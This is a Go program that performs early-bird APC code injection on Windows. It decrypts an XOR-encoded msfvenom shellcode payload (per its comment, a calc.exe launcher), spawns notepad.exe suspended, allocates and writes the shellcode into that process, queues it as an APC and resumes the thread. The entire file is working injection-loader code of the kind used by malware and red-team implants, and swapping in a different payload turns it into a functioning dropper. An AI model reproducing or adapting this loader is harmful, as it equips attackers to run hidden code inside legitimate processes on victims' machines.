package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	// msfvenom -p windows/x64/exec CMD=calc.exe --encrypt xor --encrypt-key "ABCD" -f go
	payload := []byte{0xbd, 0x0a, 0xc0, 0xa0, 0xb1, 0xaa, 0x83, 0x44, 0x41,
		0x42, 0x02, 0x15, 0x00, 0x12, 0x11, 0x15, 0x17, 0x0a, 0x72, 0x96, 0x24,
		0x0a, 0xc8, 0x16, 0x21, 0x0a, 0xc8, 0x16, 0x59, 0x0a, 0xc8, 0x16, 0x61,
		0x0a, 0xc8, 0x36, 0x11, 0x0a, 0x4c, 0xf3, 0x0b, 0x08, 0x0e, 0x75, 0x88,
		0x0a, 0x72, 0x84, 0xed, 0x7e, 0x22, 0x38, 0x43, 0x6e, 0x63, 0x05, 0x80,
		0x8b, 0x4e, 0x05, 0x40, 0x83, 0xa1, 0xa9, 0x13, 0x03, 0x12, 0x0c, 0xca,
		0x10, 0x63, 0xcf, 0x03, 0x7e, 0x0b, 0x45, 0x91, 0xc9, 0xc3, 0xcc, 0x41,
		0x42, 0x43, 0x0c, 0xc4, 0x82, 0x37, 0x23, 0x09, 0x43, 0x93, 0x14, 0xca,
		0x0a, 0x5b, 0x00, 0xca, 0x02, 0x63, 0x0d, 0x40, 0x92, 0xa0, 0x12, 0x09,
		0xbd, 0x8a, 0x05, 0xca, 0x76, 0xcb, 0x0c, 0x40, 0x94, 0x0e, 0x75, 0x88,
		0x0a, 0x72, 0x84, 0xed, 0x03, 0x82, 0x8d, 0x4c, 0x03, 0x42, 0x85, 0x79,
		0xa2, 0x36, 0xb5, 0x0d, 0x41, 0x0f, 0x60, 0x49, 0x07, 0x7a, 0x95, 0x34,
		0x9a, 0x1b, 0x00, 0xca, 0x02, 0x67, 0x0d, 0x40, 0x92, 0x25, 0x05, 0xca,
		0x4e, 0x0b, 0x00, 0xca, 0x02, 0x5f, 0x0d, 0x40, 0x92, 0x02, 0xcf, 0x45,
		0xca, 0x0b, 0x45, 0x91, 0x03, 0x1b, 0x05, 0x19, 0x1c, 0x1a, 0x1e, 0x00,
		0x1a, 0x02, 0x1d, 0x00, 0x18, 0x0b, 0xc7, 0xad, 0x62, 0x02, 0x16, 0xbe,
		0xa2, 0x1b, 0x05, 0x18, 0x18, 0x0b, 0xcf, 0x53, 0xab, 0x14, 0xbb, 0xbe,
		0xbd, 0x1e, 0x0c, 0xfb, 0x43, 0x43, 0x44, 0x41, 0x42, 0x43, 0x44, 0x41,
		0x0a, 0xce, 0xc9, 0x40, 0x43, 0x43, 0x44, 0x00, 0xf8, 0x72, 0xcf, 0x2e,
		0xc5, 0xbc, 0x91, 0xfa, 0xb2, 0xf6, 0xe6, 0x17, 0x03, 0xf9, 0xe2, 0xd4,
		0xff, 0xde, 0xbb, 0x94, 0x0a, 0xc0, 0x80, 0x69, 0x7e, 0x45, 0x38, 0x4b,
		0xc2, 0xb8, 0xa4, 0x34, 0x47, 0xf8, 0x03, 0x52, 0x30, 0x2c, 0x2e, 0x41,
		0x1b, 0x02, 0xcd, 0x9b, 0xbd, 0x96, 0x27, 0x20, 0x2e, 0x20, 0x6a, 0x24,
		0x3a, 0x26, 0x44}

	key := []byte{0x41, 0x42, 0x43, 0x44}

	for i, char := range payload {
		payload[i] = char ^ key[i%len(key)]
	}

	si := windows.StartupInfo{}
	pi := windows.ProcessInformation{}

	appName, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	cmdLine, _ := syscall.UTF16PtrFromString("")

	windows.CreateProcess(appName, cmdLine, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
	fmt.Printf("Process ID: %d\n", pi.ProcessId)
	payloadSize := uintptr(len(payload))
	fmt.Printf("Payload size: %d\n", payloadSize)

	payloadAddress, _, _ := VirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(payloadSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE)
	fmt.Printf("Payload is located at: %X\n", payloadAddress)

	windows.VirtualProtectEx(pi.Process, payloadAddress, uintptr(len(payload)), windows.PAGE_EXECUTE_READ, (*uint32)(unsafe.Pointer(&payloadSize)))
	fmt.Printf("Payload is now PAGE_EXECUTE_READ\n")

	bytesWritten := uint32(0)
	windows.WriteProcessMemory(pi.Process, payloadAddress, &payload[0], uintptr(len(payload)), (*uintptr)(unsafe.Pointer(&bytesWritten)))
	fmt.Printf("Bytes written: %d\n", bytesWritten)
	QueueUserAPC.Call(payloadAddress, uintptr(pi.Thread), 0)
	windows.ResumeThread(pi.Thread)
}
